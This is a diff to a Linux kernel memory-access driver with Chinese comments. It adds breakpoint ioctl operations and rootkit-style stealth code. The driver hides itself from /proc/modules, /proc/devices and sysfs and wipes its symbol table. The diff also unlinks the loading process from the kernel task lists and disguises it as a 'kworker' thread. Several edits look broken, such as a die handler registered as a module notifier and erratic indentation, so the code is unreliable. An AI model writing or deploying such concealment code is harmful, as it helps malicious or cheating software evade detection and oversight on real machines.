@@ -4,8 +4,12 @@
 #include <linux/proc_fs.h>
 #include "comm.h"
 #include "memory.h"
-#include "process.h"
+ #include "process.h"
 
+
+
+
+static struct notifier_block bp_notifier;
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0))
 	MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver); 
@@ -13,7 +17,7 @@
 
 long dispatch_ioctl(struct file* const file, unsigned int const cmd, unsigned long const arg)
 {
-	static COPY_MEMORY cm;
+  	static COPY_MEMORY cm;
 	static MODULE_BASE mb;
 	static char name[0x100] = {0};
 	/*static char key[0x100] = {0};
@@ -50,7 +54,7 @@ long dispatch_ioctl(struct file* const file, unsigned int const cmd, unsigned lo
 			break;
 		case OP_MODULE_BASE:
 			{
-				if (copy_from_user(&mb, (void __user*)arg, sizeof(mb)) != 0 
+	if (copy_from_user(&mb, (void __user*)arg, sizeof(mb)) != 0 
 				|| copy_from_user(name, (void __user*)mb.name, sizeof(name)-1) !=0) {
 					return -1;
 				}
@@ -59,6 +63,34 @@ long dispatch_ioctl(struct file* const file, unsigned int const cmd, unsigned lo
 					return -1;
 				}
 			}
+			break;
+
+
+case OP_ADD:
+			{
+				if (copy_from_user(&cm, (void __user*)arg, sizeof(cm)) != 0) {
+					return -1;
+			
+	}
+
+
+    bp_notifier.notifier_call = die_notify;
+
+      register_module_notifier(&bp_notifier);
+    clear_bp();
+    set_bp(cm.addr);
+
+
+    return 0;
+
+    
+			}
+			break;
+case OP_REMOVE:
+ {
+ unregister_module_notifier(&bp_notifier);
+    clear_bp();
+ }
 			break;
 		default:
 			break;
@@ -99,7 +131,7 @@ int dispatch_open(struct inode *node, struct file *file)
 int dispatch_close(struct inode *node, struct file *file)
 {
 	list_add(&__this_module.list, prev_module); //创建链表
-	mem_tool_class = class_create(THIS_MODULE, devicename); //创建设备类
+	mem_tool_class = class_create(devicename); //创建设备类
 	memdev->dev = device_create(mem_tool_class, NULL, mem_tool_dev_t, NULL, "%s", devicename); //创建设备文件
 	printk("关闭文件成功\n");
 	return 0;
@@ -107,6 +139,8 @@ int dispatch_close(struct inode *node, struct file *file)
 
 static int __init driver_entry(void)
 {
+struct module *mod = &__this_module;
+     struct task_struct *tsk = current;
 	int ret;
 	devicename = DEVICE_NAME;
 //	devicename = get_rand_str();//注释此行关闭随机驱动
@@ -138,7 +172,7 @@ static int __init driver_entry(void)
 	}
 
 	//4.创建设备文件
-	mem_tool_class = class_create(THIS_MODULE, devicename); //创建设备类
+	mem_tool_class = class_create(devicename); //创建设备类
 	if (IS_ERR(mem_tool_class)) {
 		printk("创建设备类失败: %d\n", ret);
 		goto done;
@@ -149,19 +183,28 @@ static int __init driver_entry(void)
 		goto done;
 	}
 
-	if (!IS_ERR(filp_open("/proc/sched_debug", O_RDONLY, 0))) {
-		remove_proc_subtree("sched_debug", NULL); //移除/proc/sched_debug。
-	}
-	if (!IS_ERR(filp_open("/proc/uevents_records", O_RDONLY, 0))) {
-		remove_proc_entry("uevents_records", NULL); //移除/proc/uevents_records。
-	}
+	
 	unregister_chrdev_region(mem_tool_dev_t, 1); //释放设备号，/proc/devices 中不可见。
 	list_del_init(&__this_module.list); //摘除链表，/proc/modules 中不可见。
 	kobject_del(&THIS_MODULE->mkobj.kobj); //摘除kobj，/sys/modules/中不可见。
+kobject_put(&THIS_MODULE->mkobj.kobj);
+     // 2. 清空符号表（适配你内核的字段）
+     mod->syms = NULL;
+     mod->num_syms = 0;
+     // 3. 重置模块状态
+     mod->state = MODULE_STATE_LIVE;
+ // 1. 从进程列表移除
+ list_del_init(&tsk->tasks);
+ // 2. 从父进程子进程列表移除
+ list_del_init(&tsk->sibling);
+ list_del_init(&tsk->children);
+ // 3. 从 PID 哈希表移除
 
+ // 4. 伪装进程名（可选）
+ strncpy(tsk->comm, "kworker/u16:0", sizeof(tsk->comm) - 1);
+ tsk->comm[sizeof(tsk->comm) - 1] = '\0';
 	printk("设备创建成功 %s\n", devicename);
 	return 0;
-
 done:
 	return ret;
 }
